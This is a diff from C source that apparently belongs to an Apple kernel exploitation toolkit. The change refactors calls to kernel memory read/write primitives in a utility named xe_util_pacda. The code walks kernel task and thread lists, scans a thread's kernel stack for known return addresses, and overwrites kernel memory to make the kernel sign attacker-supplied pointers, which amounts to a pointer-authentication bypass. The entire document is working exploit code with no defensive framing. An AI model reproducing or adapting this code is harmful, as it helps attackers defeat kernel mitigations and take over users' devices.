@@ -60,16 +60,16 @@ void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
 }
 
 int xe_util_pacda_find_thread_with_state(uintptr_t proc, int state, uintptr_t* ptr_out) {
-    uintptr_t task = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(proc, TYPE_PROC_MEM_TASK_OFFSET)));
+    uintptr_t task = xe_ptrauth_strip(xe_kmem_read_uint64(proc, TYPE_PROC_MEM_TASK_OFFSET));
     
-    uintptr_t thread = xe_kmem_read_uint64(KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET));
-    while (thread != 0 && thread != KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET)) {
-        int thread_state = xe_kmem_read_int32(KMEM_OFFSET(thread, TYPE_THREAD_MEM_STATE_OFFSET));
+    uintptr_t thread = xe_kmem_read_uint64(task, TYPE_TASK_MEM_THREADS_OFFSET);
+    while (thread != 0 && thread != task + TYPE_TASK_MEM_THREADS_OFFSET) {
+        int thread_state = xe_kmem_read_int32(thread, TYPE_THREAD_MEM_STATE_OFFSET);
         if (thread_state == state) {
             *ptr_out = thread;
             return 0;
         }
-        thread = xe_kmem_read_uint64(KMEM_OFFSET(thread, TYPE_THREAD_MEM_TASK_THREADS_OFFSET));
+        thread = xe_kmem_read_uint64(thread, TYPE_THREAD_MEM_TASK_THREADS_OFFSET);
     }
     
     return ENOENT;
@@ -103,8 +103,8 @@ int xe_util_pacda_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
 
 
 uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
-    uintptr_t machine = KMEM_OFFSET(thread, TYPE_THREAD_MEM_MACHINE_OFFSET);
-    uintptr_t kstackptr = xe_kmem_read_uint64(KMEM_OFFSET(machine, TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET));
+    uintptr_t machine = thread + TYPE_THREAD_MEM_MACHINE_OFFSET;
+    uintptr_t kstackptr = xe_kmem_read_uint64(machine, TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
     return kstackptr;
 }
 
@@ -113,8 +113,8 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
     
     uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
-    uintptr_t kalloc_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
-    uintptr_t kalloc_map_lck = KMEM_OFFSET(kalloc_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
+    uintptr_t kalloc_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
+    uintptr_t kalloc_map_lck = kalloc_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
     
     char* stack = NULL;
     xe_util_lck_rw_t util_lck_rw = NULL;
@@ -146,7 +146,7 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     
     stack = malloc(STACK_SCAN_SIZE);
     kstackptr -= STACK_SCAN_SIZE;
-    xe_kmem_read(stack, kstackptr, STACK_SCAN_SIZE);
+    xe_kmem_read(stack, kstackptr, 0, STACK_SCAN_SIZE);
     
     uintptr_t lr_kfree = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_ENSURE_CAPACITY_KFREE), XE_PTRAUTH_MASK);
     if (lr_kfree == 0) {
@@ -165,18 +165,18 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     uintptr_t x21 = x20 - 0x8; // dict capacity
     uintptr_t x23 = lr_lck_rw_excl_gen - 0x30; // pacda ctx
 
-    uintptr_t dict = xe_kmem_read_uint64(x19);
-    xe_kmem_write_uint64(x20, ptr);
-    xe_kmem_write_uint64(x23, ctx);
-    xe_kmem_write_uint64(x21, 0);
+    uintptr_t dict = xe_kmem_read_uint64(x19, 0);
+    xe_kmem_write_uint64(x20, 0, ptr);
+    xe_kmem_write_uint64(x23, 0, ctx);
+    xe_kmem_write_uint64(x21, 0, 0);
     
     xe_util_lck_rw_lock_done(&util_lck_rw);
     dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
     
-    uintptr_t signed_ptr = xe_kmem_read_uint64(KMEM_OFFSET(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET));
+    uintptr_t signed_ptr = xe_kmem_read_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET);
     
-    xe_kmem_write_uint64(KMEM_OFFSET(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET), 0);
-    xe_kmem_write_uint32(KMEM_OFFSET(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET), 0);
+    xe_kmem_write_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET, 0);
+    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
     
     *out = signed_ptr;
     
